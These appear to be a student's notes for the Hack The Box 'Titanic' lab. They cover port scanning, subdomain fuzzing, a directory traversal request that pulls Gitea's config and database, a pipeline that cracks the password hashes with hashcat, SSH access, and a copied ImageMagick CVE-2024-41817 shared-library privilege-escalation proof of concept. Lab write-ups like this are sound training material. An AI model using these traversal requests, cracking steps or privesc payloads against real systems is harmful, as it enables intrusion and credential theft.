# Titanic
- https://www.youtube.com/watch?v=2tQ3VhdwVsU
- https://0xdf.gitlab.io/2025/06/21/htb-titanic.html

## Setup
```
┌──(root㉿kali)-[/home/jacob/Documents/Notes/HTB_Labs]
└─# touch HTB_Titanic.md; mousepad Titanic.md
```
```
┌──(root㉿kali)-[/home/jacob/Desktop]
└─# mkdir titanic; cp nmap.sh titanic; cd titanic
```

## NMAP
```
┌──(root㉿kali)-[/home/jacob/Desktop/titanic]
└─# ./nmap.sh titanic 10.129.231.221
Running nmap scan on 10.129.231.221 with output to titanic...
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 11:41 AEST
Nmap scan report for 10.129.231.221
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.28 seconds
Scan completed successfully.
Output files created: titanic.nmap, titanic.gnmap, titanic.xml
```

## Guided Mode Questions
1. How many open TCP ports are listening on Titanic?
2

2. What is the subdomain of titanic.htb that hosts another web application different from the main website?
- `ffuf -u http://10.129.231.221 -H "Host: FUZZ.titanic.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac`
- dev

3. What is the relative path of the endpoint on the main website that is vulnerable to a directory traversal / file read vulnerability?
- fter intercepting a 'book now' request, there's some back and forth where it seems the website makes a file with the details and then fetches it with a GET request to `http://titanic.htb/download?ticket=2baba876-1969-4bf5-a7d3-21b962416b17.json"`
- Answer: /download

4. What Python web framework is the main site written in?
- Make it 404 with `http://titanic.htb/abc` and the error message is the default 404 of Flask: `https://0xdf.gitlab.io/cheatsheets/404#flask`
- GitTea also tells you

5. What kind of database is Gitea using?
- This was tricky - you had to piggy back off the previous GET request for a ticket and find the path to the `app.ini` file in the docker-compose.yml file. Once you crafted the path, append it to the URL:
```
GET /download?ticket=/home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
In the response we see: `DB_TYPE = sqlite3` (Answer is sqlite)
- Also reveals another path: `PATH = /data/gitea/gitea.db`

6. What is the full path to the gitea.db file on the host (not the container) filesystem?
- Also crafted from appending the URL part `/home/developer/gitea` to what is found in the `app.ini` file to make:`/home/developer/gitea/data/gitea/gitea.db`

7. What is the developer user's password for Gitea?
- NOT the MYSQL root password of `'MySQLP@$$w0rd!'` found in `developer/docker-config`
- Need to go to the DB file: `/home/developer/gitea/data/gitea/gitea.db`. But much more readable if you GET with curl: `curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db`
- Connect to file with: `sqlite3 gitea.db` --> `.tables` --> `select * from user;` Since user table stores passwords in hash form.
- 0xdf does this to make it clearer: `sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes`
- Result, which is saved to gitea.hashes locally:
```
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```
- Runs hashcat: `hashcat gitea.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --user`
- Output: `sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528`
- Seen at the end, it cracks developers to be `25282528`

8. Submit the flag located in the developer user's home directory.
Using the password above, ssh: `ssh developer@titanic.htb`
```
developer@titanic:~$ ls
gitea  mysql  user.txt
developer@titanic:~$ cat user.txt 
8ba80e75c6399c603bf9061ab5ea662f
```

9. What is the full path of the shell script that is run by root on a cron every minute?
- Check processes: `ps auxww`
- `/opt/scripts/` has a `identify_images.sh` (Answer: `/opt/scripts/identify_images.sh`)

10. What is the CVE ID for a 2024 vulnerability in Image Magick that can lead to privileges escalation by having it load a shared library?
```
developer@titanic:/opt/scripts$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```
- `CVE-2024-41817` (Thank you Claude) - https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
- The POC in the advisory is to run this command to build the shared library:
```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```
11. Submit the flag located in the root user's home directory.




## Lessons
- Always add subdomains to etc/hosts: `10.129.231.221 titanic.htb dev.titanic.htb`
